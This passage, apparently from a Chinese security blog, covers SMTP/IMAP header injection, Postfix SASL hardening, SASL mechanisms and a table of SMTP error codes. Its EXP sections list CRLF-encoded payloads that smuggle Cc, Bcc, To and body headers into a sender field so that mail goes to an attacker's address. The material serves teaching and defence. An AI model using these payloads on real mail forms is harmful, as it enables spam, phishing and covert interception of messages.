base64<br>Content-Disposition: attachment; filename=&quot;D:\1.html&quot;<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>VRFY——用于验证给定用户邮箱是否存在，以及接收关于该用户的详细信息；</p><p>EXPN——用于扩充邮件列表</p><h3 id="IMAP-SMTP注入"><a href="#IMAP-SMTP注入" class="headerlink" title="IMAP/SMTP注入"></a>IMAP/SMTP注入</h3><p>IMAP/SMTP 注入也就是收邮件发邮件的注入，有很多类似于这样的功能，例如要发消息给某个用户组或者某个用户，程序会提供一个发邮件的方式，输入名称、邮件地址、邮件内容即可。或者是一些重要的邮件通知功能找回密码登录等，要用户填入信息进行验证发送邮件给自己。而注入就是未对用户输入的地址做严格的过滤和限制，导致可以加入一些其他的邮件头，例如 CC 抄送等。</p><p>发一封信，包含smtp协议部分和信体部分。</p><p>协议部分，比如sent from，rcpt to等命令</p><p>信体中则才包含from，to，cc等头部。比如我们用foxmail收到一封信，你在foxmail里看到的这封信的所有内容就是信体部分，包含发件人，收件人，抄送，标题等。</p><p>当一封信有多个收件人，包含to，cc和bcc，smtp协议首先会把所有的收件人逐个进行rcpt to，然后信体部分包含to和cc的头部（注意不包含bcc的头部，这也是为什么信体中看不到暗送收件人的原因）</p><p><strong>只有被rcpt to的收件人才会收到信件。</strong></p><p> 举个例子</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">sender</span>：<span class="hljs-selector-attr">[send@dyang.com]</span>(<span class="hljs-attribute">mailto</span>:send<span class="hljs-variable">@dyang</span>.com)<br><br><span class="hljs-selector-tag">to1</span>:<span class="hljs-selector-tag">to1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br><br><span class="hljs-selector-tag">cc1</span>:<span class="hljs-selector-tag">cc1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br><br><span class="hljs-selector-tag">bcc1</span>:<span class="hljs-selector-tag">bcc1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><p>这封信要被发出去，步骤是这样的：</p><p>1.smtp协议进行rcpt to命令，对象为所有收件人，<a href="mailto:to1@dyang.com,cc1@dyang.com,bcc1@dyang.com">to1@dyang.com,cc1@dyang.com,bcc1@dyang.com</a></p><p>2.信体部分，加上几个头部</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">to:</span><span class="hljs-keyword">to</span><span class="hljs-number">1</span><span class="hljs-title">@dyang.com</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">cc:</span><span class="hljs-keyword">cc</span><span class="hljs-number">1</span><span class="hljs-title">@dyang.com</span><br></code></pre></td></tr></table></figure><p>注意不会填加bcc头部。</p><p>3.然后加载信件主体部分再发出去。</p><p>4.收件人收信。因为收件人看到的信件是信体部分，所有看不到bcc的收件人。这样达到了暗送的目的。</p><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><ol><li>   CC/BCC注入</li></ol><p>在发送者字段(sender)后注入CC和BCC参数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ACc:recipient<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ABcc:recipient<span class="hljs-number">1</span><span class="hljs-title">@domain.com</span><br></code></pre></td></tr></table></figure><p>所以现在,消息将被发送到recipient和recipient1账户。</p><ol start="2"><li>   参数注射</li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ATo:attacker<span class="hljs-title">@domain.com</span><br></code></pre></td></tr></table></figure><p>现在消息将被发送到原来的收件人和攻击者帐户。注意，这里的攻击者的账户是我们通过注入额外传入的。</p><ol start="3"><li>   邮件主题注入</li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ASubject:This’s<span class="hljs-variable">%20</span>Fake<span class="hljs-variable">%20</span>Subject<br></code></pre></td></tr></table></figure><p>攻击者注入的假的主题subject将被添加到原来的主题中并且在某些情况下将取代原本的主题subject。这取决于邮件服务行为。即代码编写的容错性，当参数中出现两个subject的时候代码是选择丢弃还是后者覆盖。</p><ol start="4"><li>   改变消息的主体body</li></ol><p>要注意SMTP的Mail格式，消息主题和头部Header之间有两个换行符(和HTTP是一样的)。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>AMy<span class="hljs-variable">%20</span>New<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>Fake<span class="hljs-variable">%20</span>Message.<br></code></pre></td></tr></table></figure><p>假消息将被添加到原始消息中。</p><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">test@test.com\nbcc:hack@hack.com<br></code></pre></td></tr></table></figure><p>发送后邮件会抄送给<a href="mailto:&#104;&#x61;&#99;&#x6b;&#64;&#x68;&#x61;&#99;&#107;&#x2e;&#x63;&#111;&#x6d;">&#104;&#x61;&#99;&#x6b;&#64;&#x68;&#x61;&#99;&#107;&#x2e;&#x63;&#111;&#x6d;</a></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">smtpd_sasl_auth_enable = yes<br><span class="hljs-meta">#</span><span class="bash">指定postfix使用sasl验证 通俗的将就是启用smtp并要求进行账号、密码效验</span><br><br>smtpd_sasl_local_domain = $mydomain<br><span class="hljs-meta">#</span><span class="bash">指定SMTP认证的本地域名 本次配置可以使用 smtpd_sasl_local_domain = <span class="hljs-string">&#x27;&#x27;</span> 或干脆注释掉 默认为空</span><br><br>smtpd_sasl_security_options = noanonymous<br><span class="hljs-meta">#</span><span class="bash">取消smtp的匿名登录 此项默认值为noanonymous smtp若能匿名登录危害非常大 此项请务必指定为noanonymous</span><br></code></pre></td></tr></table></figure><h3 id="枚举服务器邮箱地址"><a href="#枚举服务器邮箱地址" class="headerlink" title="枚举服务器邮箱地址"></a>枚举服务器邮箱地址</h3><p>禁用VRFY和EXPN，通过VRFY和EXPN可以枚举服务器邮箱地址</p><h3 id="SASL-简单认证和安全层"><a href="#SASL-简单认证和安全层" class="headerlink" title="SASL - 简单认证和安全层"></a>SASL - 简单认证和安全层</h3><pre><code>     SASL是一种用来扩充C/S模式验证能力的机制认证机制,  全称Simple Authentication and Security Layer.</code></pre><p> 当你设定sasl时，你必须决定两件事；一是用于交换“标识信 息”（或称身份证书）的验证机制；一是决定标识信息存储方法的验证架构。</p><p> sasl验证机制规范client与server之间的应答过程以及传输内容的编码方法，sasl验证架构决定服务器本身如何存储客户端的身份证书以及如何核验客户端提供的密码。</p><p> 如果客户端能成功通过验证，服务器端就能确定用户的身份， 并借此决定用户具有怎样的权限。</p><p> 比较常见的机制；</p><p>4.1 plain(较常用)</p><pre><code>       plain是最简单的机制，但同时也是最危险的机制，因为身份证书（登录名称与密码）是以base64字符串格式通过网络，没有任何加密保护措施。因此，使用plain机制时，你可能会想要结合tls。</code></pre><p>4.2 login</p><pre><code>       login不是其正式支持的机制，但某些旧版的mua使用这种机制，所以cyrus sasl让你可选择其是否支持login机制。如果你的用户仍在使用这类老掉牙的mua，你必须在编译sasl函数库时，指定要包含login的支持。 login的证书交换过程类似plain。</code></pre><p>4.3 otp</p><pre><code>    otp是一种使用“单次密码”的验证机制。此机制不提供任何加密保护，因为没必要－－每个密码都只能使用一次，每次联机都要改用新密码。smto client必须能够产生otp证书。</code></pre><p>4.4 digest-md5(较常用)</p><pre><code>       使用这种机制时，client与server共享同一个隐性密码，而且此密码不通过网络传输。验证过程是从服务器        先    提出challenge（质询）开始， 客户端使用此challenge与隐性密码计算出一个response（应答）。不同        的    challenge，不可能计算出相同的response；任何拥 有secret password的一方，都可以用相同的              challenge算出相同的response。因此，服务器只要比较客户端返回的response是否与自己算 出的response相    同，就可以知道客户端所拥有的密码是否正确。由于真正的密码并没有通过网络，所以不怕网络监测。</code></pre><p>4.5 kerberos</p><pre><code>    kerberos是一种网络型验证协议。除非你的网络已经使用kerberos，否则你应该用不到kerberos机制；相对        的，如果你的网络已经架设了kerberos验证中心，sasl就能完美的将smtp验证整合进现有的体系。</code></pre><p>4.6 anonymous</p><pre><code>   anonymous机制对smtp没有意义，因为smtp验证的用意在于限制转发服务的使用对象，而不是为了形成        open relay，sasl之所以提供这种机制，主要是为了支持其他协议。       当 客户端链接到一个支持sasl的邮件服务器时，服务器会以优先级列出可用的机制供客户端选择。如果客户        端也支持多钟机制，则当第一种机制验证失败时，客户 端可能会继续尝试第二种机制，直到通过验证或是所        有    机    制都失败为止。如果双方在一开始就无法协调出共同的机制，验证过程就算失败。       一旦双方在使用哪种机制上达成共识，就开始进行验证过程。实际的交互过程随机制而定，但通常包含一次        或多次应答过程。验证协议本身也规定了应答内容的编码格式。</code></pre><ol start="5"><li><p>总结 </p><p>  数字证书, 是级联认证派发的, 最上层是根CA认证中心. 数字证书的根本作用, 是为了保证所有人公钥的安全性和真实性. 大致认证过程是: 通过CA的公钥来解出该CA所派发的证书里面所包含的公钥(用户或者机构的). 并通过该公钥来验证证书持有人的真实性. (因为持有人并不一定是证书所有人)</p><p>  通过上面对SSL的分析，我们可以看到，SSL并不能阻止别人获得你传输的数据，但是由于你传输的数据都是加 密过的，别人拿到了毫无用处，一样可以保护信 息的安全。还有一点需要强调一下，SSL并不依赖于TCP，它可以 建立在任何可靠的传输层协议（比如TCP）之上。也就是说SSL是不能建立在UDP之上 的。这是显然的，如果传输都不可靠，偶尔丢两个包或者包的顺序换一换的话，怎么保证安全呢？<br>   SASL是提供一种用户身份认证机制, 你可以简单认为是用来认证用户的账号/密码是否运行进入系统或者使用系统的服务. 一般较长使用digest-md5, 该种机制下, 密码可以不用在网络上传输, 也就不用怕密码被窃听.</p></li></ol><h2 id="SMTP错误码"><a href="#SMTP错误码" class="headerlink" title="SMTP错误码"></a>SMTP错误码</h2><table><thead><tr><th>420</th><th>1. Timeout Communication Problem Encountered During Transmission. Thie Is a Novell Groupwise Smtp Error 2. Tcp Read Error 3. Tcp Write Error</th><th>在联机时发生通讯中断的问题；Novell GroupWise SMTP服务器的错误讯息</th></tr></thead><tbody><tr><td>此错误讯息只适用于Novell GroupWise SMTP服务器，在此不多做赘述。</td><td>N/A</td><td></td></tr><tr><td>421</td><td>1. Service Not Available, Closing Transmission Channel [this May Be a Reply To Any Command If the Service Knows It Must Shut Down] 2. Service Not Available - the Sending Email Program Should Try Again Later</td><td>括号内的主机无法提供正常的邮件服务，关闭传送管道，邮件将滞留在主机上</td></tr><tr><td>收信者端邮件服务器暂时无法上线。</td><td>请收信者和邮件管理者确认收信端邮件服务器是否正常作业，通常是由于邮递员停机做问题的检测或是邮件服务器正在重开机中又或是服务器正在同时间处理大量的新进邮件或新进要求。这类情形不会持续太久，若能晚点在尝试发送，也许问题已经解决。请注意的是：这里指的邮件服务器可能是邮件发送途中的任何一台邮件服务器。若是这种情形发生的太过于频繁，则需要与邮递员讨论。</td><td></td></tr><tr><td>421</td><td>1. the Smtp Service/server You Use Has a Limit On the Number of Concurrent Smtp Streams Your Server Can Use 2. Too Many Concurrent Smtp Connections From This Ip Address; Please Try Again Later</td><td>收件者 SMTP 主机拒绝提供服务，因为已经超过其能提供的最大服务量</td></tr><tr><td>SMTP 主机最大联机数量已达</td><td>稍后再试</td><td></td></tr><tr><td>422</td><td>The Recipient’s Mailbox Is Over Its Storage Limit</td><td>收信者邮件信箱的信件已经超过允许的最大容量</td></tr><tr><td>可能收信者信箱被塞满</td><td>1. 请收信者整理邮件信箱 2. 请收信者通知邮递员加大信箱空间</td><td></td></tr><tr><td>422</td><td>The Size of the Message Exceeds the Recipient’s Size Limits For Incoming Emails</td><td>邮件大小超过收信端邮件信箱的单次收信大小</td></tr><tr><td>邮件大小超过收信端邮件信箱的单次收信大小。</td><td>1. 请收信者通知邮递员加大单次收信大小； 2. 收信者通知发件人分次寄送过大信件的内容。</td><td></td></tr><tr><td>431</td><td>The Recipient’s Mail Server Is Experiencing a Disk Full Condition</td><td>收信端的邮件服务器磁盘空间已满</td></tr><tr><td>收信端的邮件服务器磁盘空间已满</td><td>请收信者通知邮递员清出可用空间以供使用</td><td></td></tr><tr><td>432</td><td>The Recipient’s Exchange Server Incoming Mail Queue Has Been Stopped</td><td>收信者的 Exchange Server 的新进信件处理程序已经停止</td></tr><tr><td>通常是Exchange Server 管理者正在处理一些问题。</td><td>请收信者通知邮递员处理。</td><td></td></tr><tr><td>441</td><td>The Recipient’s Server Is Not Responding</td><td>收信端的邮件服务器没有回应</td></tr><tr><td>收件端邮件服务器没有反应，可能正在维护中</td><td>寄信端邮件服务器会再次或多次尝试寄送，您无需担心</td><td></td></tr><tr><td>442</td><td>The Connection Was Dropped During Transmission</td><td>传送邮件的过程中联机中断</td></tr><tr><td>传送的过程中联机中断</td><td>1. 检查邮件是否带有病毒附件 2. 当然病毒或是黑客的可能性也不容忽视。</td><td></td></tr><tr><td>446</td><td>The Maximum Hop Count Was Exceeded For the Message</td><td>邮件传送时经过的服务器跃点数已经超过最大值</td></tr><tr><td>邮件可能在内部网络中的两台服务器中被转来转去以致于超过最大跃点数；也有可能是邮件在发信端与收信端的邮件服务器之间来回跳跃，而造成超过最大跃点数</td><td>请与ISP联络检查网络问题</td><td></td></tr><tr><td>449</td><td>Routing Error</td><td>路由错误</td></tr><tr><td>此错误讯息只适用于Microsoft Exchange Server，在此不多做赘述。</td><td>通知收件者网络管理员</td><td></td></tr><tr><td>450</td><td>Requested Mail Action Not Taken - the Mailbox Was Unavailable at the Remote End</td><td>所要求的邮件动作无法执行：收信端无此账户</td></tr><tr><td>收信端无此账户</td><td>检查是否拼错字</td><td></td></tr><tr><td>450</td><td>Please Try Again Later</td><td>请在尝试一次</td></tr><tr><td>通常发生在对方启用灰名单防垃圾信机制的缘故</td><td>无需理会，让服务器自动重寄</td><td></td></tr><tr><td>450</td><td>Host Down</td><td>邮件服务器不在在线</td></tr><tr><td>收信端邮件主机故障</td><td>稍后再重寄</td><td></td></tr><tr><td>450 5.2.3</td><td>Msg Size Greater Than Allowed By Remote Host</td><td>邮件大小超过收信端的上限</td></tr><tr><td>邮件大小超过收信端的上限</td><td>1. 请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 2. 请收信端邮递员将收信上限提高 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>451</td><td>Requested Action Aborted: Local Error in Processing</td><td>要求动作中断：在本地处理邮件时产生错误</td></tr><tr><td>原因1：收信端 SMTP 软件可能已经当机</td><td>请寄信者针对此问题通知对方网络管理员</td><td></td></tr><tr><td>451</td><td>(x.x.x.x) Has Recently Sent Spam</td><td>(x.x.x.x) 被认定近期常发送垃圾信</td></tr><tr><td>IP地址可能落在垃圾信IP数据库内</td><td>请邮递员检验相关垃圾信来源的数据库</td><td></td></tr><tr><td>451</td><td>Requested Action Delayed – Local Problem</td><td>传输延迟：指令被延迟，本地的错误</td></tr><tr><td>此问题表示收件者邮件服务器故障</td><td>稍后在试或通知收件者网络管理员</td><td></td></tr><tr><td>451</td><td>Unable To Complete Command, Dns Not Available Or Timed Out</td><td>无法完成指令，DNS系统无法提供服务导致服务停摆</td></tr><tr><td>DNS解析的问题</td><td>收信端邮件服务器主机无法解析DNS，请稍后在试</td><td></td></tr><tr><td>451</td><td>Domain of Sender Address Does Not Resolve</td><td>无法解析发信者的邮件地址</td></tr><tr><td>DNS解析的问题</td><td>请检查寄信端邮件服务器网络卡设定以及确认该DNS服务器是否正常工作;</td><td></td></tr><tr><td>451</td><td>Max Smtp Services Exceeded, Please Try Again Later</td><td>已超过最高的SMTP联机数，请稍后再试</td></tr><tr><td>SMTP服务太过繁忙；可能被当垃圾信跳板服务器。</td><td>1. 提高最高SMTP联机数并且稍后再试 2. 关闭 Open Relay 3. 开启 SMTP AUTH 身份认证</td><td></td></tr><tr><td>451</td><td>Read Error From Mail.mail.xxx.xxx.xxx</td><td>读取错误自&lt;邮件服务器&gt;</td></tr><tr><td>可能是DNS指向设定错误。</td><td>1. 请检查DNS是否正常运作</td><td></td></tr><tr><td>451 4.1.8</td><td>Domain of Sender Address <a href="mailto:&#x58;&#120;&#120;&#x40;&#x78;&#120;&#x78;&#46;&#120;&#x78;&#x78;">&#x58;&#120;&#120;&#x40;&#x78;&#120;&#x78;&#46;&#120;&#x78;&#x78;</a> Does Not Resolve</td><td>无法解析送信者邮件信箱所属的网域</td></tr><tr><td>DNS的问题比如需要做DNS反解。</td><td>通知邮递员并检查DNS设定是否正常。</td><td></td></tr><tr><td>451 4.7.1</td><td>Greylisting in Action, Please Come Back in 00:02:00 [minutes]</td><td>灰色名单功能运行中，请在两分钟后再寄一次邮件</td></tr><tr><td>灰色名单功能运行中</td><td>请在两分钟后再寄一次邮件（服务器会自动重寄）</td><td></td></tr><tr><td>452</td><td>Requested Action Not Taken: Insufficient System Storage</td><td>要求动作无法执行：系统空间不足</td></tr><tr><td>收件者邮件服务器硬盘可能已满</td><td>解决办法是等一段时间之后再行寄，或者通知收信者网络管理员</td><td></td></tr><tr><td>452</td><td>Too Many Recipients</td><td>在单次待发邮件中有过多收信者邮件账号</td></tr><tr><td>此问题可能发生在寄信端ISP、收信端ISP或甚至是发信端邮件服务器：由于一些其他的问题发生导致所有使用者无法发信件，当问题修复完成时的那一瞬间，所有的信件一下子蜂拥而至塞满服务器的储存空间甚至也塞满系统内存的资源，此错误讯息就会发生。</td><td>1. 解决办法是等一段时间之后，等尖峰期过后再行寄送。</td><td></td></tr><tr><td>452</td><td>Out of Memory</td><td>内存不足</td></tr><tr><td>此问题可能发生在寄信端ISP、收信端ISP或甚至是发信端邮件服务器：由于一些其他的问题发生导致所有使用者无法发信件，当问题修复完成时的那一瞬间，所有的信件一下子蜂拥而至塞满服务器的储存空间甚至也塞满系统内存的资源，此错误讯息就会发生。</td><td>1. 解决办法是等一段时间之后，等尖峰期过后再行寄送。</td><td></td></tr><tr><td>465</td><td>Invalid Response Code Received From Server</td><td>自服务器接收到无效的认证回应</td></tr><tr><td>自2010年开始，osTicket或是其他的邮件服务器开始使用此错误代码，若是认证设定有错误时，收信者的邮件服务器会回应此错误代码。</td><td>1. 请收信者联络邮递员解决认证设定上的修正。</td><td></td></tr><tr><td>471</td><td>This Is a Local Error With the Sending Server And Is Often Followed With “please Try Again Later”</td><td>发信端的邮件服务器自身发生错误时，时常会回报请稍候再试</td></tr><tr><td>此错误码471或4.7.1经常被当作一般SMTP错误码的附带码比如：451 4.7.1。 原因一：有此附带码的错误通常都和寄信端邮件服务器上的反垃圾信机制或是防病毒软件有关连。并且是由这类程序内的程序瑕疵或程序自动更新机制所造成。 原因二：内存不足或硬盘上的数据损毁等等硬件上的问题。</td><td>原因1： 1. 与软件商联络咨询有无解法； 2. 若这些软件并非专门的邮件服务器版本时，将邮件扫瞄的功能关闭。 原因2： 1. 与邮递员联系并做硬件除错。</td><td></td></tr><tr><td>500</td><td>Syntax Error, Command Not Recognized [this May Include Errors Such As Command Line Too Long]</td><td>语法错误，无法辨识的指令</td></tr><tr><td>原因：1. 最后一个从发信端邮件服务器发出的SMTP或ESMTP指令无法为收件者的服务器所辨识。 原因2. 或是指令的格式不符合对方服务器的要求，此间包含指令字符串太长 上述两个原因通常是防病毒软件或是防火墙程序对于SMTP进或出的端口造成影响。</td><td>可能有防火墙软硬件阻挡了一些新型态的 SMTP 指令，可关闭防火墙或防病毒软件进行测试</td><td></td></tr><tr><td>500</td><td>Line Too Long</td><td>指令太长，无法辨识</td></tr><tr><td>指令的格式不符合对方服务器的要求，此间包含指令字符串太长。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>500</td><td>Access Denied By Port Access</td><td>端口存取被拒</td></tr><tr><td>指令的格式不符合对方服务器的要求，此间包含指令字符串太长。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>500</td><td>Unrecognized Command</td><td>无法辨识的指令</td></tr><tr><td>最后一个从发信端邮件服务器发出的SMTP或ESMTP指令无法为收件者的服务器所辨识。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>501</td><td>Can Sometimes Also Be Indicative of Communication Problems</td><td>有时可能是网络线路的问题</td></tr><tr><td>网络线路的问题。</td><td>请在command prompt底下键入ping 168.95.1.1还有ping其他响应快速的网站比如<a href="http://www.microsoft.com以及www.hinet.net等等来测试网络是否顺畅.若出现响应时间太慢或是有断讯的现象,请向网络管理员反映./">www.microsoft.com以及www.hinet.net等等来测试网络是否顺畅。若出现响应时间太慢或是有断讯的现象，请向网络管理员反映。</a></td><td></td></tr><tr><td>501</td><td>Sender Email Is Not in My Domain</td><td>发信者账号不在发信者所属网域</td></tr><tr><td>笔误</td><td>请确认发件人账号无误</td><td></td></tr><tr><td>501</td><td>Recipient Is Not Verified</td><td>无法确认收信者的邮件账号</td></tr><tr><td>收信者的邮件账号可能输入错误。</td><td>请与对方确认邮件账号。</td><td></td></tr><tr><td>501</td><td>Sender Domain Must Exist</td><td>发信者的网域必须存在</td></tr><tr><td>原因1：DNS的问题 原因2：发件人邮件地址域名可能输入错误</td><td>原因1： 请确认DNS设定没问题 原因2： 请确认邮件账号中的域名是正确的</td><td></td></tr><tr><td>501</td><td>Syntax Error in Parameters Or Arguments</td><td>系统指令的参数错误</td></tr><tr><td>系统指令的参数错误</td><td>1. 请确认.信箱账号无误 2. 网域名无误 3. Linux/Unix 的SEND MAIL 指令依照标准语法</td><td></td></tr><tr><td>501</td><td>Path Too Long</td><td>系统指令的参数错误</td></tr><tr><td>系统指令的参数错误。</td><td>请确认指令参数符合标准</td><td></td></tr><tr><td>501</td><td>Syntax Helo Hostname</td><td>语法: HELO hostname</td></tr><tr><td>收信者邮件服务器要求发件人邮件服务器发送正确的指令语法</td><td>使用 EVO Mail Server 应不致于有这款问题</td><td></td></tr><tr><td>501</td><td>Invalid Domain Name</td><td>无效的域名</td></tr><tr><td>无效的域名。</td><td>请确认域名无误。</td><td></td></tr><tr><td>501 5.1.3</td><td>Invalid Address</td><td>无效的邮件地址</td></tr><tr><td>无效的邮件地址。</td><td>请确认邮件地址无误。</td><td></td></tr><tr><td>501 5.1.3</td><td>Bad Recipient Address Syntax</td><td>收信者邮件账号语法错误</td></tr><tr><td>收信端邮件账号语法错误。</td><td>请确认邮件地址无误。</td><td></td></tr><tr><td>501 5.5.4</td><td>Invalid Address</td><td>不合法的IP地址</td></tr><tr><td>若收信端邮件服务器是MS Exchange Server 5.5， 2000， 2003而收到此错误讯息时，</td><td>请与收信端邮递员联络并附上<a href="http://support.microsoft.com/kb/291828.%E5%B0%86Exchange">http://support.microsoft.com/kb/291828.将Exchange</a> Server予以修正。</td><td></td></tr><tr><td>502</td><td>1. Unimplemented Command 2. Command Not Implemented</td><td>SMTP指令的语法错误，原因不明</td></tr><tr><td>收件者邮件服务器主机不支持某些基本的 SMTP 指令</td><td>联系对方邮递员并建议它更新软件</td><td></td></tr><tr><td>503</td><td>1. Polite People Say Helo First 2. Error: Need Mail Command 3. Need Mail Before Rcpt 4. Bad Sequence of Commands</td><td>SMTP指令顺序出错，一般出现在其他错误之后，先检查之前出现的错误提示</td></tr><tr><td>这类问题通常是寄件用 SMTP 软件设计不良或是防火墙造成</td><td>替 SMTP 软件更新版本并检查防火墙是否有阻止某些指令</td><td></td></tr><tr><td>503</td><td>This Mail Server Requires Authentication When Attempting To Send To a Non-local E-mail Address. Please Check Your Mail Client Settings Or Contact Your Administrator To Verify That the Domain Or Address Is Defined For This Server</td><td>邮件服务器需要身份认证，请检查收信软件中的设定</td></tr><tr><td>寄信者若没有经过身份认证将无法对网域外的收信者发信</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>503</td><td>No Recipients Specified</td><td>没有指定收信者</td></tr><tr><td>收信者字段若没有指定邮件账号，信件无法寄出</td><td>请在收信者字段输入收信者电子邮件账号</td><td></td></tr><tr><td>504</td><td>1. Command Parameter Not Implemented 2. Need To Authenticate First</td><td>1. 此SMTP指令没有内建此参数 2. 登入之前需要认证</td></tr><tr><td>在邮件服务器内，此指令无设此参数而造成验证失败</td><td>请收信者洽邮递员</td><td></td></tr><tr><td>505</td><td>Client Was Not Authenticated</td><td>客户端没有经过认证无法登入</td></tr><tr><td>在Outlook或是Outlook Express里使用gmail或是yahoo信箱的Smtp服务器时，若没有设定好一些选项，会出现此项错误讯息。</td><td>1. 要用雅虎或GMAIL的邮箱发信； 2. 要加入身份验证； 3. 要在「个人信息」中填写正确邮箱地址； 4. 要点选「SMTP服务器需要认证」。</td><td></td></tr><tr><td>510</td><td>Bad Email Address</td><td>无效的电子邮件账号</td></tr><tr><td>此错误讯息发自寄信端邮件服务器。若是TO， CC， BCC的收信者位在网域内，表示这些收信者不存在；若是收信者是收信者邮件账号是网外账号，表示这些账号可能笔误。</td><td>请确认收件端账号是否正确。</td><td></td></tr><tr><td>511</td><td>1. Bad Email Address 2. Sorry, Recipient Address Has Invalid Format</td><td>1. 无效的邮件账号 2. 收件者信箱格式错误</td></tr><tr><td>表示这些收件者电子邮件地址可能有笔误</td><td>请确认收件端账号是否正确</td><td></td></tr><tr><td>512</td><td>The Host Server For the Recipient’s Domain Name Cannot Be Found (dns Error)</td><td>找不到负责收信者邮件账号的邮件服务器主机</td></tr><tr><td>若是一切都正确，则有可能是DNS服务器上的解析纪录有问题，通常是负责本身邮件服务器的DNS服务器或是所属ISP的DNS服务器无法正确解析。</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>512</td><td>Bad Destination Host ‘dns Hard Error Looking Up Domain</td><td>DNS系统中找不到这收信者的网域名</td></tr><tr><td>主要是DNS系统无法解析</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>512</td><td>The Message Could Not Be Delivered Because the Recipient’s Destination Email System Is Unknown Or Invalid. Please Check the Address And Try Again, Or Contact Your System Administrator To Verify Connectivity To the Email System of the Recipient</td><td>收信者的邮件服务器或是邮件信箱账号可能出现问题以致于无法传递信件，请洽网络管理员以确认收信者的邮件系统是否正常</td></tr><tr><td>若是一切都正确，则有可能是DNS服务器上的解析纪录有问题，通常是负责本身邮件服务器的DNS服务器或是所属ISP的DNS服务器无法正确解析。</td><td>可通知邮递员加以确认。</td><td></td></tr><tr><td>512</td><td>Conditions are Caused By Misspellings of the Domain Name Part of a Recipient Email Address</td><td>收信者邮件地指的网域部分可能有错误，以致于出现此问题</td></tr><tr><td>主要是DNS系统无法解析邮件里TO，CC，BCC中信箱地址的网域名。</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>513</td><td>Relaying Denied Or Authentication Required (a Small Percentage of Mail Servers)</td><td>邮件寄送被拒或是需要验证（一小部分的邮件服务器有此规范）</td></tr><tr><td>小部分的邮件服务器需要寄信者在寄信之前做身份的验证。</td><td>请邮件服务器管理员确认认证步骤并在邮件程序里设定好安全验证的步骤</td><td></td></tr><tr><td>523</td><td>The Recipient’s Mailbox Cannot Receive Messages This Big</td><td>由于信箱大小的上限，收信者的邮件信箱无法接收此邮件</td></tr><tr><td>收信者的信箱大小受到限制。</td><td>1. 请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 2.请收信端邮递员将收信上限提高 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>530</td><td>Authentication Is Required</td><td>寄送之前，请做身份认证</td></tr><tr><td>寄件端邮件服务器设定了一个寄信前必须做身份认证的机制。但是在邮件客户端程序比如Outlook里头您没有勾选输入认证数据的设定。</td><td>1. 请在Outlook里的「我的服务器需要验证」打勾来启动SMTP AUTH的功能。</td><td></td></tr><tr><td>530</td><td>1. Your Server Has Been Blacklisted By the Recipient’s Server 2. the Recipient’s Mailbox Does Not Exist 3. the Message Cannot Be Delivered Due To a Configuration Error On the Server. Please Contact Your Administrator</td><td>1. 发件人的邮件服务器已经被置入收信者的黑名单之中 2. 收信者的信箱不存在 3. 